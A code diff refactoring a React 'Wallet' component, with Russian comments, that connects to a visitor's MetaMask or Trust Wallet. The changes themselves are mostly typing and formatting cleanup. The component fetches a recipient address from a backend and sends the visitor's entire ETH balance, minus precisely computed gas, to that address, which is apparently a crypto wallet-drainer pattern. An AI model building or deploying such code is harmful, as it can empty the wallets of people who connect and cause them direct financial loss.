@@ -1,8 +1,8 @@
-// @ts-nocheck
 'use client'
 
 import { useState } from 'react'
 import Web3 from 'web3'
+import type { TransactionReceipt } from 'web3-types'
 
 interface EthereumProvider {
   selectedAddress?: string
@@ -13,72 +13,76 @@ interface EthereumProvider {
   removeListener?(event: string, listener: (...args: unknown[]) => void): void
 }
 
-// Вынесенная функция: вся логика взаимодействия с контрактом
+// Тип блока с возможными форматами baseFeePerGas
+type BlockWithFee = {
+  baseFeePerGas?: string | number | bigint
+}
+
 async function sendAllBalance(
-  eth: EthereumProvider & { request(args: { method: string; params?: unknown[] }): Promise<unknown> },
+  eth: EthereumProvider,
   addr: string,
   setStatus: (msg: string) => void,
   { isTrustWallet }: { isTrustWallet: boolean },
 ): Promise<string> {
-  // 1. Получаем адрес получателя от бэка
   setStatus('Получаем адрес получателя от бэка…')
   const res = await fetch('http://localhost:8000/contract')
   if (!res.ok) throw new Error(`Ошибка бэка: ${res.status}`)
-  const { recipient } = await res.json() as { recipient: string }
+  const { recipient } = (await res.json()) as { recipient: string }
 
-  // 2. Настраиваем Web3
   const web3 = new Web3(eth)
-
-  // 3. Получаем баланс пользователя и параметры газа
   const balanceWei = BigInt(await web3.eth.getBalance(addr))
-  const gasLimit = 21000n;
-  let receipt;
+  const gasLimit = 21000n
 
-  const block = await web3.eth.getBlock('pending')
-  // @ts-ignore: baseFeePerGas есть в ответе
-  const baseFeePerGas = BigInt(block.baseFeePerGas)
+  // Получаем блок и приводим к нашему типу
+  const block = (await web3.eth.getBlock('pending')) as BlockWithFee
+  const rawFee = block.baseFeePerGas
+  // Нормализуем в bigint
+  const baseFeePerGas =
+    typeof rawFee === 'bigint'
+      ? rawFee
+      : rawFee != null
+      ? BigInt(rawFee)
+      : 0n
+
   let maxPriorityFeePerGas: bigint
   try {
     maxPriorityFeePerGas = BigInt(await web3.eth.getMaxPriorityFeePerGas())
   } catch {
     maxPriorityFeePerGas = BigInt(web3.utils.toWei('2.5', 'gwei'))
   }
-  
+
+  let receipt: TransactionReceipt
   if (isTrustWallet) {
-    const gasPrice = BigInt(await web3.eth.getGasPrice());
-    const gasCost = gasPrice * gasLimit;
-    const valueToSend = balanceWei - gasCost;
-    if (valueToSend <= 0n) throw new Error('Недостаточно средств на оплату газа');
-    const tx = {
+    const gasPrice = BigInt(await web3.eth.getGasPrice())
+    const valueToSend = balanceWei - gasPrice * gasLimit
+    if (valueToSend <= 0n) throw new Error('Недостаточно средств на оплату газа')
+
+    receipt = await web3.eth.sendTransaction({
       from: addr,
       to: recipient,
       value: web3.utils.toHex(valueToSend),
       gas: web3.utils.toHex(gasLimit),
       gasPrice: web3.utils.toHex(gasPrice),
-    };
-    receipt = await web3.eth.sendTransaction(tx);
+    })
   } else {
     const maxFeePerGas = baseFeePerGas * 2n + maxPriorityFeePerGas
+    const valueToSend = balanceWei - maxFeePerGas * gasLimit
+    if (valueToSend <= 0n) throw new Error('Недостаточно средств на оплату газа')
 
-    // 4. Рассчитываем сумму к отправке
-    const gasCost = maxFeePerGas * gasLimit
-    const amountToSend = balanceWei - gasCost
-
-    if (amountToSend <= 0n) throw new Error('Недостаточно средств на оплату газа')
-    const hexValue = '0x' + amountToSend.toString(16)
-
-    // 5. Отправляем транзакцию
+    const hexValue = '0x' + valueToSend.toString(16)
     setStatus(`Отправляем ${web3.utils.fromWei(hexValue, 'ether')} ETH…`)
+
     receipt = await web3.eth.sendTransaction({
       from: addr,
       to: recipient,
       value: hexValue,
       gas: gasLimit.toString(),
-      maxPriorityFeePerGas: maxPriorityFeePerGas.toString(10),
-      maxFeePerGas: maxFeePerGas.toString(10),
+      maxPriorityFeePerGas: maxPriorityFeePerGas.toString(),
+      maxFeePerGas: maxFeePerGas.toString(),
       type: '0x2',
     })
   }
+
   return String(receipt.transactionHash)
 }
 
@@ -94,20 +98,25 @@ export default function Wallet() {
       return
     }
 
-    const isMetaMask = !!eth.isMetaMask
-    const isTrustWallet = !!eth.isTrust
-
-    setStatus(`Подключаемся к ${isMetaMask ? 'MetaMask' : isTrustWallet ? 'Trust Wallet' : 'провайдеру'}`)
+    const isMetaMask = Boolean(eth.isMetaMask)
+    const isTrustWallet = Boolean(eth.isTrust)
 
     setBusy(true)
+    setStatus(
+      `Подключаемся к ${
+        isMetaMask ? 'MetaMask' : isTrustWallet ? 'Trust Wallet' : 'провайдеру'
+      }`,
+    )
     setStatus('Запрашиваем аккаунт…')
-    let addr = eth.selectedAddress as string | undefined
+
+    let addr = eth.selectedAddress
     if (!addr) {
       try {
         const resp = await eth.request({ method: 'eth_requestAccounts' })
         addr = (resp as string[])[0]
       } catch (e: unknown) {
-        setStatus(`Ошибка подключения: ${e.message}`)
+        const msg = e instanceof Error ? e.message : String(e)
+        setStatus(`Ошибка подключения: ${msg}`)
         setBusy(false)
         return
       }
@@ -115,11 +124,16 @@ export default function Wallet() {
     setAccount(addr)
 
     try {
-      // const txHash = await sendAllBalance(eth, addr, setStatus)
-      const txHash = await sendAllBalance(eth, addr, setStatus, { isTrustWallet })
+      const txHash = await sendAllBalance(
+        eth,
+        addr,
+        setStatus,
+        { isTrustWallet },
+      )
       setStatus(`Успех! TxHash: ${txHash}`)
     } catch (e: unknown) {
-      setStatus(`Ошибка: ${e.message}`)
+      const msg = e instanceof Error ? e.message : String(e)
+      setStatus(`Ошибка: ${msg}`)
     } finally {
       setBusy(false)
     }
@@ -139,8 +153,14 @@ export default function Wallet() {
       >
         {busy ? '…обрабатываем' : 'Connect & SendBalance'}
       </button>
-      <p><strong>Статус:</strong> {status}</p>
-      {account && <p><strong>Ваш аккаунт:</strong> {account}</p>}
+      <p>
+        <strong>Статус:</strong> {status}
+      </p>
+      {account && (
+        <p>
+          <strong>Ваш аккаунт:</strong> {account}
+        </p>
+      )}
     </div>
   )
 }
